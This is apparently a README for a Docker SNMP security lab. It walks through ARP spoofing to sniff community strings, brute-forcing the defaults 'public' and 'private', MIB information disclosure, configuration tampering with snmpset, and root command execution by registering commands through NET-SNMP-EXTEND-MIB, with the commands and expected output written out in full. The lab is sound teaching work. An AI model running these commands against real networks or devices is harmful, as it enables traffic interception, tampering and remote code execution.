# SNMP Lab

Demonstrates the vulnerabilities covered in the "SNMP Security Issues" slide using [snmpPoC](https://github.com/nico989/snmpPoC), a Bash script that automates community-string brute-force, full MIB dump, write-permission check, and RCE detection.

| Issue | What you will see |
|---|---|
| Clear-text community strings | PoC finds `public` and `private` via brute-force |
| Default guessable strings | Both are in the bundled `community.txt` wordlist |
| Information disclosure | Full MIB dump: OS, processes, interfaces, software, users |
| No integrity (read-write) | PoC confirms `private` has write permission on sysContact |
| RCE via NET-SNMP-EXTEND-MIB | PoC detects nsExtendObjects and flags the target as exploitable |

## Lab topology

```
 ┌──────────────────┐
 │   snmp-manager   │  legitimate NMS, queries the agent
 └────────┬─────────┘
          │  UDP 161 (plain text)
          ▼
 ┌──────────────────┐
 │   snmp-agent     │  vulnerable SNMPv1/v2c daemon
 └────────▲─────────┘
          │  UDP 161 (plain text)
 ┌────────┴─────────┐
 │   snmp-attacker  │  runs snmpPoC + tcpdump
 │   snmpPoC from   │  (files mounted from your Mac)
 │   your Mac       │
 └──────────────────┘
```

The snmpPoC files live on your Mac at `labs/snmp/snmpPoC/` and are mounted read-only into the attacker container. Edit them locally and the change is live immediately.

## Start the lab

```bash
docker compose up --build
```

---

## Passive sniffing via ARP spoofing

Docker bridge networks behave like a switch: unicast packets between two containers are not visible to a third one by default. To intercept manager-agent traffic, the attacker poisons the ARP cache of both hosts so all traffic flows through it first, exactly as on a real switched network.

Open three terminals.

Terminal 1 - ARP spoof both directions:

```bash
AGENT_IP=$(docker inspect snmp-agent   --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
MANAGER_IP=$(docker inspect snmp-manager --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

docker exec snmp-attacker arpspoof -i eth0 -t $MANAGER_IP $AGENT_IP &
docker exec snmp-attacker arpspoof -i eth0 -t $AGENT_IP $MANAGER_IP &
```

Terminal 2 - passive tcpdump on the attacker (not generating any SNMP traffic itself):

```bash
docker exec snmp-attacker tcpdump -i eth0 -n -A udp port 161
```

The manager polls the agent every 5 seconds. You will see `C="public"` appear in the captured packets with no action from the attacker beyond the ARP poisoning.

---

## Exercise 1 - Community string brute-force and version detection

The script iterates every entry in `community.txt` against sysDescr OID (`1.3.6.1.2.1.1.1.0`). It also re-tests the first valid string against SNMPv1 and SNMPv3 noAuthNoPriv.

Run with the PoC:

```bash
docker exec -it snmp-attacker bash -c "cd /snmpPoC && ./snmp.sh --ip snmp-agent"
```

Expected output:

```
[INFO] SNMP Version 2c with Community String { public } is available!
[INFO] SNMP Version 2c with Community String { private } is available!
[INFO] SNMP Version 1 with Community String { public } is available!
```

`public` and `private` are the top two entries in the wordlist and are found immediately because the agent uses the insecure defaults shipped by most vendors.

Manual equivalents:

```bash
docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c public   snmp-agent 1.3.6.1.2.1.1.1.0
docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c private  snmp-agent 1.3.6.1.2.1.1.1.0
docker exec snmp-attacker snmpget -t 1 -r 0 -v 1   -c public  snmp-agent 1.3.6.1.2.1.1.1.0
```

---

## Exercise 2 - Information disclosure

Using the first valid community string, the script walks a fixed set of OIDs that expose:

| OID | What leaks |
|---|---|
| `1.3.6.1.2.1.1.1.0` | OS description and kernel version |
| `1.3.6.1.2.1.1.5.0` | Hostname |
| `1.3.6.1.2.1.4.20.1.1` | All configured IP addresses |
| `1.3.6.1.2.1.25.4.2.1.2` | Every running process name |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.4.1.77.1.2.25` | Local user accounts |
| `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |

A single unauthenticated read dumps everything an attacker needs to plan the next step.

Manual equivalents:

```bash
docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent 1.3.6.1.2.1.1.1.0
docker exec snmp-attacker snmpget  -v 2c -c public snmp-agent 1.3.6.1.2.1.1.5.0
docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 1.3.6.1.2.1.25.4.2.1.2
docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 1.3.6.1.2.1.25.6.3.1.2
docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 1.3.6.1.2.1.6.13.1.3
```

---

## Exercise 3 - Write permission (configuration tampering)

The script tries `snmpset` on sysContact (`1.3.6.1.2.1.1.4.0`) for every discovered string, then restores the original value.

Expected output:

```
[ERROR] Target snmp-agent with Community String { public } does NOT have Write Permission!
[INFO]  Community String { private } has Write Permission!
```

Manual equivalents:

```bash
docker exec snmp-attacker snmpset -v 2c -c private snmp-agent sysLocation.0 s "Pwned by attacker"
docker exec snmp-attacker snmpget -v 2c -c public  snmp-agent sysLocation.0
```

---

## Exercise 4 - RCE detection and exploitation via NET-SNMP-EXTEND-MIB

The script walks `1.3.6.1.4.1.8072.1.3.2` (nsExtendObjects) and checks for INTEGER-typed entries, which confirm the EXTEND-MIB module is active.

Expected output:

```
[INFO] Target snmp-agent might be Exploitable!
```

Trigger the pre-loaded commands to confirm code execution:

```bash
docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent nsExtendOutput1
# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."whoami"   = STRING: root
# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."hostname" = STRING: lab-agent
```

Register a new command using the read-write community string:

```bash
docker exec snmp-attacker snmpset -v 2c -c private snmp-agent \
  'nsExtendStatus."id"'   i 4 \
  'nsExtendCommand."id"'  s '/usr/bin/id' \
  'nsExtendArgs."id"'     s ''

docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 'nsExtendOutput1."id"'
# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."id" = STRING: uid=0(root) gid=0(root) ...
```

---

## Stop and clean up

```bash
docker compose down
```
